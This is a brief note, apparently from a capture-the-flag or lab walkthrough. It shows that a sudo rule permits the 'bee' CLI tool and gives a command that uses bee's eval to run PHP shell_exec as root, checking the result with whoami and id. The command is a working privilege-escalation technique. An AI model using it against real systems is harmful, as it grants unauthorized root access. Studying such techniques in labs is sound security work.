sudo -l shows bee


```
sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('whoami && id');"
```


function eval allows arbitrary php code execution